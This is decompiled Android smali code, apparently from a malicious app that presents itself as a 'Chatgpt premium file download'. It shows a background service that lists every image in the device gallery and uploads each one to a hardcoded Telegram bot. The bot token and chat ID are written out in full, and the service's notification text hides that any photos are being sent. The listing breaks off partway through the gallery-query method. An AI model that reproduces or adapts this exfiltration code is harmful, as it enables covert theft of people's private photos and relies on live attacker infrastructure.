# classes5.dex

.class public final Lcom/example/service/PhotoUploadService;
.super Landroid/app/Service;
.source "PhotoUploadService.kt"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/example/service/PhotoUploadService$Companion;,
        Lcom/example/service/PhotoUploadService$GalleryPhoto;
    }
.end annotation

.annotation runtime Lkotlin/Metadata;
    d1 = {
        "\u0000b\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000b\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0010\b\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0004\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0007\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0010 \n\u0002\u0018\u0002\n\u0002\b\u0005\n\u0002\u0018\u0002\n\u0002\b\u0003\b\u0007\u0018\u0000 ,2\u00020\u0001:\u0002,-B\u0007¢\u0006\u0004\b\u0002\u0010\u0003J\b\u0010\f\u001a\u00020\rH\u0016J\"\u0010\u000e\u001a\u00020\u000f2\b\u0010\u0010\u001a\u0004\u0018\u00010\u00112\u0006\u0010\u0012\u001a\u00020\u000f2\u0006\u0010\u0013\u001a\u00020\u000fH\u0016J\b\u0010\u0014\u001a\u00020\rH\u0002J \u0010\u0015\u001a\u00020\u00162\u0006\u0010\u0017\u001a\u00020\u00182\u0006\u0010\u0019\u001a\u00020\u000f2\u0006\u0010\u001a\u001a\u00020\u000fH\u0002J \u0010\u001b\u001a\u00020\r2\u0006\u0010\u0017\u001a\u00020\u00182\u0006\u0010\u0019\u001a\u00020\u000f2\u0006\u0010\u001a\u001a\u00020\u000fH\u0002J\b\u0010\u001c\u001a\u00020\rH\u0002J\b\u0010\u001d\u001a\u00020\rH\u0002J \u0010\u001e\u001a\u00020\u000b2\u0006\u0010\u001f\u001a\u00020 2\u0006\u0010!\u001a\u00020\u00182\u0006\u0010\"\u001a\u00020\u0018H\u0002J\u000e\u0010#\u001a\b\u0012\u0004\u0012\u00020%0$H\u0002J\b\u0010&\u001a\u00020\rH\u0002J\b\u0010\'\u001a\u00020\rH\u0016J\u0012\u0010(\u001a\u00020\r2\b\u0010)\u001a\u0004\u0018\u00010\u0011H\u0016J\u0014\u0010*\u001a\u0004\u0018\u00010+2\b\u0010\u0010\u001a\u0004\u0018\u00010\u0011H\u0016R\u000e\u0010\u0004\u001a\u00020\u0005X\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\u0006\u001a\u00020\u0007X\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\b\u001a\u00020\tX\u0082.¢\u0006\u0002\n\u0000R\u000e\u0010\n\u001a\u00020\u000bX\u0082\u000e¢\u0006\u0002\n\u0000¨\u0006."
    }
    d2 = {
        "Lcom/example/service/PhotoUploadService;",
        "Landroid/app/Service;",
        "<init>",
        "()V",
        "job",
        "Lkotlinx/coroutines/CompletableJob;",
        "serviceScope",
        "Lkotlinx/coroutines/CoroutineScope;",
        "repository",
        "Lcom/example/data/UploadRepository;",
        "isUploading",
        "",
        "onCreate",
        "",
        "onStartCommand",
        "",
        "intent",
        "Landroid/content/Intent;",
        "flags",
        "startId",
        "startForegroundServiceWithNotification",
        "createNotification",
        "Landroid/app/Notification;",
        "contentText",
        "",
        "progress",
        "max",
        "updateNotification",
        "createNotificationChannel",
        "startPhotoUploading",
        "performRealUpload",
        "uri",
        "Landroid/net/Uri;",
        "name",
        "serverUrl",
        "queryGalleryPhotos",
        "",
        "Lcom/example/service/PhotoUploadService$GalleryPhoto;",
        "stopUploadingService",
        "onDestroy",
        "onTaskRemoved",
        "rootIntent",
        "onBind",
        "Landroid/os/IBinder;",
        "Companion",
        "GalleryPhoto",
        "app"
    }
    k = 0x1
    mv = {
        0x2,
        0x2,
        0x0
    }
    xi = 0x30
.end annotation


# static fields
.field public static final $stable:I

.field public static final ACTION_START:Ljava/lang/String; = "com.example.service.ACTION_START"

.field public static final ACTION_STOP:Ljava/lang/String; = "com.example.service.ACTION_STOP"

.field private static final CHANNEL_ID:Ljava/lang/String; = "photo_upload_channel"

.field public static final Companion:Lcom/example/service/PhotoUploadService$Companion;

.field private static final NOTIFICATION_ID:I = 0x3039

.field private static final TAG:Ljava/lang/String; = "PhotoUploadService"


# instance fields
.field private isUploading:Z

.field private final job:Lkotlinx/coroutines/CompletableJob;

.field private repository:Lcom/example/data/UploadRepository;

.field private final serviceScope:Lkotlinx/coroutines/CoroutineScope;


# direct methods
.method static constructor <clinit>()V
    .registers 2

    new-instance v0, Lcom/example/service/PhotoUploadService$Companion;

    const/4 v1, 0x0

    invoke-direct {v0, v1}, Lcom/example/service/PhotoUploadService$Companion;-><init>(Lkotlin/jvm/internal/DefaultConstructorMarker;)V

    sput-object v0, Lcom/example/service/PhotoUploadService;->Companion:Lcom/example/service/PhotoUploadService$Companion;

    const/16 v0, 0x8

    sput v0, Lcom/example/service/PhotoUploadService;->$stable:I

    return-void
.end method

.method public constructor <init>()V
    .registers 3

    .line 38
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 40
    const/4 v0, 0x0

    const/4 v1, 0x1

    invoke-static {v0, v1, v0}, Lkotlinx/coroutines/SupervisorKt;->SupervisorJob$default(Lkotlinx/coroutines/Job;ILjava/lang/Object;)Lkotlinx/coroutines/CompletableJob;

    move-result-object v0

    iput-object v0, p0, Lcom/example/service/PhotoUploadService;->job:Lkotlinx/coroutines/CompletableJob;

    .line 41
    invoke-static {}, Lkotlinx/coroutines/Dispatchers;->getIO()Lkotlinx/coroutines/CoroutineDispatcher;

    move-result-object v0

    iget-object v1, p0, Lcom/example/service/PhotoUploadService;->job:Lkotlinx/coroutines/CompletableJob;

    check-cast v1, Lkotlin/coroutines/CoroutineContext;

    invoke-virtual {v0, v1}, Lkotlinx/coroutines/CoroutineDispatcher;->plus(Lkotlin/coroutines/CoroutineContext;)Lkotlin/coroutines/CoroutineContext;

    move-result-object v0

    invoke-static {v0}, Lkotlinx/coroutines/CoroutineScopeKt;->CoroutineScope(Lkotlin/coroutines/CoroutineContext;)Lkotlinx/coroutines/CoroutineScope;

    move-result-object v0

    iput-object v0, p0, Lcom/example/service/PhotoUploadService;->serviceScope:Lkotlinx/coroutines/CoroutineScope;

    .line 38
    return-void
.end method

.method public static final synthetic access$getRepository$p(Lcom/example/service/PhotoUploadService;)Lcom/example/data/UploadRepository;
    .registers 2
    .param p0, "$this"  # Lcom/example/service/PhotoUploadService;

    .line 38
    iget-object v0, p0, Lcom/example/service/PhotoUploadService;->repository:Lcom/example/data/UploadRepository;

    return-object v0
.end method

.method public static final synthetic access$isUploading$p(Lcom/example/service/PhotoUploadService;)Z
    .registers 2
    .param p0, "$this"  # Lcom/example/service/PhotoUploadService;

    .line 38
    iget-boolean v0, p0, Lcom/example/service/PhotoUploadService;->isUploading:Z

    return v0
.end method

.method public static final synthetic access$performRealUpload(Lcom/example/service/PhotoUploadService;Landroid/net/Uri;Ljava/lang/String;Ljava/lang/String;)Z
    .registers 5
    .param p0, "$this"  # Lcom/example/service/PhotoUploadService;
    .param p1, "uri"  # Landroid/net/Uri;
    .param p2, "name"  # Ljava/lang/String;
    .param p3, "serverUrl"  # Ljava/lang/String;

    .line 38
    invoke-direct {p0, p1, p2, p3}, Lcom/example/service/PhotoUploadService;->performRealUpload(Landroid/net/Uri;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    return v0
.end method

.method public static final synthetic access$queryGalleryPhotos(Lcom/example/service/PhotoUploadService;)Ljava/util/List;
    .registers 2
    .param p0, "$this"  # Lcom/example/service/PhotoUploadService;

    .line 38
    invoke-direct {p0}, Lcom/example/service/PhotoUploadService;->queryGalleryPhotos()Ljava/util/List;

    move-result-object v0

    return-object v0
.end method

.method public static final synthetic access$stopUploadingService(Lcom/example/service/PhotoUploadService;)V
    .registers 1
    .param p0, "$this"  # Lcom/example/service/PhotoUploadService;

    .line 38
    invoke-direct {p0}, Lcom/example/service/PhotoUploadService;->stopUploadingService()V

    return-void
.end method

.method public static final synthetic access$updateNotification(Lcom/example/service/PhotoUploadService;Ljava/lang/String;II)V
    .registers 4
    .param p0, "$this"  # Lcom/example/service/PhotoUploadService;
    .param p1, "contentText"  # Ljava/lang/String;
    .param p2, "progress"  # I
    .param p3, "max"  # I

    .line 38
    invoke-direct {p0, p1, p2, p3}, Lcom/example/service/PhotoUploadService;->updateNotification(Ljava/lang/String;II)V

    return-void
.end method

.method private final createNotification(Ljava/lang/String;II)Landroid/app/Notification;
    .registers 14
    .param p1, "contentText"  # Ljava/lang/String;
    .param p2, "progress"  # I
    .param p3, "max"  # I

    .line 92
    new-instance v0, Landroid/content/Intent;

    move-object v1, p0

    check-cast v1, Landroid/content/Context;

    const-class v2, Lcom/example/MainActivity;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object v1, v0

    .local v1, "$this$createNotification_u24lambda_u240\\1":Landroid/content/Intent;
    const/4 v2, 0x0

    .line 93
    .local v2, "$i$a$-apply-PhotoUploadService$createNotification$notificationIntent$1\\1\\92\\0":I
    const v3, 0x10008000

    invoke-virtual {v1, v3}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 94
    nop

    .line 92
    .end local v1  # "$this$createNotification_u24lambda_u240\\1":Landroid/content/Intent;
    .end local v2  # "$i$a$-apply-PhotoUploadService$createNotification$notificationIntent$1\\1\\92\\0":I
    nop

    .line 95
    .local v0, "notificationIntent":Landroid/content/Intent;
    nop

    .line 96
    nop

    .line 95
    const/high16 v1, 0xc000000

    .line 100
    .local v1, "pendingIntentFlags":I
    move-object v2, p0

    check-cast v2, Landroid/content/Context;

    const/4 v3, 0x0

    invoke-static {v2, v3, v0, v1}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v2

    .line 102
    .local v2, "pendingIntent":Landroid/app/PendingIntent;
    new-instance v4, Landroid/content/Intent;

    move-object v5, p0

    check-cast v5, Landroid/content/Context;

    const-class v6, Lcom/example/service/PhotoUploadService;

    invoke-direct {v4, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object v5, v4

    .local v5, "$this$createNotification_u24lambda_u241\\2":Landroid/content/Intent;
    const/4 v6, 0x0

    .line 103
    .local v6, "$i$a$-apply-PhotoUploadService$createNotification$stopIntent$1\\2\\102\\0":I
    const-string v7, "com.example.service.ACTION_STOP"

    invoke-virtual {v5, v7}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 104
    nop

    .line 102
    .end local v5  # "$this$createNotification_u24lambda_u241\\2":Landroid/content/Intent;
    .end local v6  # "$i$a$-apply-PhotoUploadService$createNotification$stopIntent$1\\2\\102\\0":I
    nop

    .line 105
    .local v4, "stopIntent":Landroid/content/Intent;
    move-object v5, p0

    check-cast v5, Landroid/content/Context;

    const/4 v6, 0x1

    invoke-static {v5, v6, v4, v1}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v5

    .line 107
    .local v5, "stopPendingIntent":Landroid/app/PendingIntent;
    new-instance v7, Landroidx/core/app/NotificationCompat$Builder;

    move-object v8, p0

    check-cast v8, Landroid/content/Context;

    const-string v9, "photo_upload_channel"

    invoke-direct {v7, v8, v9}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 108
    const-string v8, "Chatgpt premium file download"

    check-cast v8, Ljava/lang/CharSequence;

    invoke-virtual {v7, v8}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v7

    .line 109
    move-object v8, p1

    check-cast v8, Ljava/lang/CharSequence;

    invoke-virtual {v7, v8}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v7

    .line 110
    const v8, 0x1080088

    invoke-virtual {v7, v8}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v7

    .line 111
    invoke-virtual {v7, v2}, Landroidx/core/app/NotificationCompat$Builder;->setContentIntent(Landroid/app/PendingIntent;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v7

    .line 112
    invoke-virtual {v7, v6}, Landroidx/core/app/NotificationCompat$Builder;->setOngoing(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v7

    .line 113
    invoke-virtual {v7, v6}, Landroidx/core/app/NotificationCompat$Builder;->setOnlyAlertOnce(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v7

    .line 115
    nop

    .line 116
    const-string v8, "বন্ধ করুন"

    check-cast v8, Ljava/lang/CharSequence;

    .line 117
    nop

    .line 114
    const v9, 0x1080038

    invoke-virtual {v7, v9, v8, v5}, Landroidx/core/app/NotificationCompat$Builder;->addAction(ILjava/lang/CharSequence;Landroid/app/PendingIntent;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v7

    const-string v8, "addAction(...)"

    invoke-static {v7, v8}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    .line 107
    nop

    .line 120
    .local v7, "builder":Landroidx/core/app/NotificationCompat$Builder;
    if-lez p3, :cond_80

    .line 121
    invoke-virtual {v7, p3, p2, v3}, Landroidx/core/app/NotificationCompat$Builder;->setProgress(IIZ)Landroidx/core/app/NotificationCompat$Builder;

    goto :goto_83

    .line 123
    :cond_80
    invoke-virtual {v7, v3, v3, v6}, Landroidx/core/app/NotificationCompat$Builder;->setProgress(IIZ)Landroidx/core/app/NotificationCompat$Builder;

    .line 126
    :goto_83
    invoke-virtual {v7}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v3

    const-string v6, "build(...)"

    invoke-static {v3, v6}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    return-object v3
.end method

.method private final createNotificationChannel()V
    .registers 5

    .line 136
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_29

    .line 137
    new-instance v0, Landroid/app/NotificationChannel;

    .line 138
    nop

    .line 139
    const-string v1, "Chatgpt premium সার্ভিস"

    check-cast v1, Ljava/lang/CharSequence;

    .line 140
    nop

    .line 137
    const-string v2, "photo_upload_channel"

    const/4 v3, 0x2

    invoke-direct {v0, v2, v1, v3}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 141
    move-object v1, v0

    .local v1, "$this$createNotificationChannel_u24lambda_u242\\1":Landroid/app/NotificationChannel;
    const/4 v2, 0x0

    .line 142
    .local v2, "$i$a$-apply-PhotoUploadService$createNotificationChannel$channel$1\\1\\141\\0":I
    const-string v3, "গ্যালারি থেকে ফটো ব্যাকগ্রাউন্ডে ট্রান্সফার করার জন্য ব্যবহৃত হয়"

    invoke-virtual {v1, v3}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    .line 143
    nop

    .line 141
    .end local v1  # "$this$createNotificationChannel_u24lambda_u242\\1":Landroid/app/NotificationChannel;
    .end local v2  # "$i$a$-apply-PhotoUploadService$createNotificationChannel$channel$1\\1\\141\\0":I
    nop

    .line 137
    nop

    .line 144
    .local v0, "channel":Landroid/app/NotificationChannel;
    const-class v1, Landroid/app/NotificationManager;

    invoke-virtual {p0, v1}, Lcom/example/service/PhotoUploadService;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    .line 145
    .local v1, "manager":Landroid/app/NotificationManager;
    invoke-virtual {v1, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 147
    .end local v0  # "channel":Landroid/app/NotificationChannel;
    .end local v1  # "manager":Landroid/app/NotificationManager;
    :cond_29
    return-void
.end method

.method private final performRealUpload(Landroid/net/Uri;Ljava/lang/String;Ljava/lang/String;)Z
    .registers 20
    .param p1, "uri"  # Landroid/net/Uri;
    .param p2, "name"  # Ljava/lang/String;
    .param p3, "serverUrl"  # Ljava/lang/String;

    .line 277
    move-object/from16 v1, p2

    .line 302
    invoke-virtual/range {p0 .. p0}, Lcom/example/service/PhotoUploadService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    move-object/from16 v2, p1

    invoke-virtual {v0, v2}, Landroid/content/ContentResolver;->openInputStream(Landroid/net/Uri;)Ljava/io/InputStream;

    move-result-object v3

    .line 278
    .local v3, "inputStream":Ljava/io/InputStream;
    if-eqz v3, :cond_e0

    invoke-static {v3}, Lkotlin/io/ByteStreamsKt;->readBytes(Ljava/io/InputStream;)[B

    move-result-object v0

    if-nez v0, :cond_16

    goto/16 :goto_e0

    :cond_16
    move-object v5, v0

    .line 279
    .local v5, "bytes":[B
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 281
    new-instance v0, Lokhttp3/OkHttpClient$Builder;

    invoke-direct {v0}, Lokhttp3/OkHttpClient$Builder;-><init>()V

    .line 282
    sget-object v4, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v6, 0x2d

    invoke-virtual {v0, v6, v7, v4}, Lokhttp3/OkHttpClient$Builder;->connectTimeout(JLjava/util/concurrent/TimeUnit;)Lokhttp3/OkHttpClient$Builder;

    move-result-object v0

    .line 283
    sget-object v4, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v0, v6, v7, v4}, Lokhttp3/OkHttpClient$Builder;->writeTimeout(JLjava/util/concurrent/TimeUnit;)Lokhttp3/OkHttpClient$Builder;

    move-result-object v0

    .line 284
    sget-object v4, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v0, v6, v7, v4}, Lokhttp3/OkHttpClient$Builder;->readTimeout(JLjava/util/concurrent/TimeUnit;)Lokhttp3/OkHttpClient$Builder;

    move-result-object v0

    .line 285
    invoke-virtual {v0}, Lokhttp3/OkHttpClient$Builder;->build()Lokhttp3/OkHttpClient;

    move-result-object v0

    .line 281
    move-object v11, v0

    .line 287
    .local v11, "client":Lokhttp3/OkHttpClient;
    sget-object v0, Lokhttp3/MediaType;->Companion:Lokhttp3/MediaType$Companion;

    const-string v4, "image/*"

    invoke-virtual {v0, v4}, Lokhttp3/MediaType$Companion;->parse(Ljava/lang/String;)Lokhttp3/MediaType;

    move-result-object v6

    .line 288
    .local v6, "mediaType":Lokhttp3/MediaType;
    sget-object v4, Lokhttp3/RequestBody;->Companion:Lokhttp3/RequestBody$Companion;

    const/4 v9, 0x6

    const/4 v10, 0x0

    const/4 v7, 0x0

    const/4 v8, 0x0

    invoke-static/range {v4 .. v10}, Lokhttp3/RequestBody$Companion;->create$default(Lokhttp3/RequestBody$Companion;[BLokhttp3/MediaType;IIILjava/lang/Object;)Lokhttp3/RequestBody;

    move-result-object v4

    .line 290
    .local v4, "fileBody":Lokhttp3/RequestBody;
    new-instance v0, Lokhttp3/MultipartBody$Builder;

    const/4 v7, 0x1

    const/4 v8, 0x0

    invoke-direct {v0, v8, v7, v8}, Lokhttp3/MultipartBody$Builder;-><init>(Ljava/lang/String;ILkotlin/jvm/internal/DefaultConstructorMarker;)V

    .line 291
    sget-object v7, Lokhttp3/MultipartBody;->FORM:Lokhttp3/MediaType;

    invoke-virtual {v0, v7}, Lokhttp3/MultipartBody$Builder;->setType(Lokhttp3/MediaType;)Lokhttp3/MultipartBody$Builder;

    move-result-object v0

    .line 292
    const-string v7, "chat_id"

    const-string v9, "8471022379"

    invoke-virtual {v0, v7, v9}, Lokhttp3/MultipartBody$Builder;->addFormDataPart(Ljava/lang/String;Ljava/lang/String;)Lokhttp3/MultipartBody$Builder;

    move-result-object v0

    .line 293
    const-string v7, "photo"

    invoke-virtual {v0, v7, v1, v4}, Lokhttp3/MultipartBody$Builder;->addFormDataPart(Ljava/lang/String;Ljava/lang/String;Lokhttp3/RequestBody;)Lokhttp3/MultipartBody$Builder;

    move-result-object v0

    .line 294
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "ফাইল: "

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    const-string v9, "caption"

    invoke-virtual {v0, v9, v7}, Lokhttp3/MultipartBody$Builder;->addFormDataPart(Ljava/lang/String;Ljava/lang/String;)Lokhttp3/MultipartBody$Builder;

    move-result-object v0

    .line 295
    invoke-virtual {v0}, Lokhttp3/MultipartBody$Builder;->build()Lokhttp3/MultipartBody;

    move-result-object v0

    .line 290
    move-object v7, v0

    .line 297
    .local v7, "requestBody":Lokhttp3/MultipartBody;
    new-instance v0, Lokhttp3/Request$Builder;

    invoke-direct {v0}, Lokhttp3/Request$Builder;-><init>()V

    .line 298
    const-string v9, "https://api.telegram.org/bot8287022863:AAERVVoSz8crfknJcRF5qtD88tivhL0wRSs/sendPhoto"

    invoke-virtual {v0, v9}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v0

    .line 299
    move-object v9, v7

    check-cast v9, Lokhttp3/RequestBody;

    invoke-virtual {v0, v9}, Lokhttp3/Request$Builder;->post(Lokhttp3/RequestBody;)Lokhttp3/Request$Builder;

    move-result-object v0

    .line 300
    invoke-virtual {v0}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    move-result-object v0

    .line 297
    move-object v9, v0

    .line 302
    .local v9, "request":Lokhttp3/Request;
    invoke-virtual {v11, v9}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;

    move-result-object v0

    invoke-interface {v0}, Lokhttp3/Call;->execute()Lokhttp3/Response;

    move-result-object v0

    move-object v10, v0

    check-cast v10, Ljava/io/Closeable;

    :try_start_a5
    move-object v0, v10

    check-cast v0, Lokhttp3/Response;

    .local v0, "response\\1":Lokhttp3/Response;
    const/4 v12, 0x0

    .line 303
    .local v12, "$i$a$-use-PhotoUploadService$performRealUpload$1\\1\\302\\0":I
    const-string v13, "PhotoUploadService"

    invoke-virtual {v0}, Lokhttp3/Response;->code()I

    move-result v14

    new-instance v15, Ljava/lang/StringBuilder;

    invoke-direct {v15}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "Telegram Upload response code: "

    invoke-virtual {v15, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v14}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v14, " for "

    invoke-virtual {v8, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v13, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 304
    invoke-virtual {v0}, Lokhttp3/Response;->isSuccessful()Z

    move-result v8
    :try_end_d3
    .catchall {:try_start_a5 .. :try_end_d3} :catchall_d8

    const/4 v0, 0x0

    .end local v0  # "response\\1":Lokhttp3/Response;
    .end local v12  # "$i$a$-use-PhotoUploadService$performRealUpload$1\\1\\302\\0":I
    invoke-static {v10, v0}, Lkotlin/io/CloseableKt;->closeFinally(Ljava/io/Closeable;Ljava/lang/Throwable;)V

    return v8

    :catchall_d8
    move-exception v0

    move-object v8, v0

    .end local v3  # "inputStream":Ljava/io/InputStream;
    .end local v4  # "fileBody":Lokhttp3/RequestBody;
    .end local v5  # "bytes":[B
    .end local v6  # "mediaType":Lokhttp3/MediaType;
    .end local v7  # "requestBody":Lokhttp3/MultipartBody;
    .end local v9  # "request":Lokhttp3/Request;
    .end local v11  # "client":Lokhttp3/OkHttpClient;
    .end local p1  # "uri":Landroid/net/Uri;
    .end local p2  # "name":Ljava/lang/String;
    .end local p3  # "serverUrl":Ljava/lang/String;
    :try_start_da
    throw v8
    :try_end_db
    .catchall {:try_start_da .. :try_end_db} :catchall_db

    .restart local v3  # "inputStream":Ljava/io/InputStream;
    .restart local v4  # "fileBody":Lokhttp3/RequestBody;
    .restart local v5  # "bytes":[B
    .restart local v6  # "mediaType":Lokhttp3/MediaType;
    .restart local v7  # "requestBody":Lokhttp3/MultipartBody;
    .restart local v9  # "request":Lokhttp3/Request;
    .restart local v11  # "client":Lokhttp3/OkHttpClient;
    .restart local p1  # "uri":Landroid/net/Uri;
    .restart local p2  # "name":Ljava/lang/String;
    .restart local p3  # "serverUrl":Ljava/lang/String;
    :catchall_db
    move-exception v0

    invoke-static {v10, v8}, Lkotlin/io/CloseableKt;->closeFinally(Ljava/io/Closeable;Ljava/lang/Throwable;)V

    throw v0

    .line 278
    .end local v4  # "fileBody":Lokhttp3/RequestBody;
    .end local v5  # "bytes":[B
    .end local v6  # "mediaType":Lokhttp3/MediaType;
    .end local v7  # "requestBody":Lokhttp3/MultipartBody;
    .end local v9  # "request":Lokhttp3/Request;
    .end local v11  # "client":Lokhttp3/OkHttpClient;
    :cond_e0
    :goto_e0
    const/4 v0, 0x0

    return v0
.end method

.method private final queryGalleryPhotos()Ljava/util/List;
    .registers 18
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/List<",
            "Lcom/example/service/PhotoUploadService$GalleryPhoto;",
            ">;"
        }
    .end annotation

    .line 309
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    move-object v1, v0

    check-cast v1, Ljava/util/List;

    .line 311
    .local v1, "list":Ljava/util/List;
    const/4 v0, 0x3

    new-array v0, v0, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v3, "_id"

    aput-object v3, v0, v2

    .line 312
    const/4 v2, 0x1

    const-string v4, "_display_name"

    aput-object v4, v0, v2

    .line 311
    nop

    .line 313
    const/4 v2, 0x2

    const-string v5, "_size"

    aput-object v5, v0, v2

    .line 311
    nop

    .line 310
    move-object v8, v0

    .line 315
    .local v8, "projection":[Ljava/lang/String;
    const-string v11, "date_added DESC"

    .line 317
    .local v11, "sortOrder":Ljava/lang/String;
    sget-object v7, Landroid/provider/MediaStore$Images$Media;->EXTERNAL_CONTENT_URI:Landroid/net/Uri;

    .line 318
    .local v7, "queryUri":Landroid/net/Uri;
    invoke-virtual/range {p0 .. p0}, Lcom/example/service/PhotoUploadService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v6

    const/4 v9, 0x0

    const/4 v10, 0x0

    invoke-virtual/range {v6 .. v11}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    if-eqz v0, :cond_96

    move-object v2, v0

    check-cast v2, Ljava/io/Closeable;

    :try_start_30
    move-object v0, v2

    check-cast v0, Landroid/database/Cursor;

    .local v0, "cursor\\1":Landroid/database/Cursor;
    const/4 v6, 0x0

    .line 319
    .local v6, "$i$a$-use-PhotoUploadService$queryGalleryPhotos$1\\1\\318\\0":I
    invoke-interface {v0, v3}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v3

    .line 320
    .local v3, "idColumn\\1":I
    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v4

    .line 321
    .local v4, "nameColumn\\1":I
    invoke-interface {v0, v5}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v5

    .line 323
    .local v5, "sizeColumn\\1":I
    :goto_40
    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v9

    if-eqz v9, :cond_85

    .line 324
    invoke-interface {v0, v3}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v9

    .line 325
    .local v9, "id\\1":J
    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    if-nez v12, :cond_69

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    const-string v13, "photo_"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12, v9, v10}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, ".jpg"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    .line 326
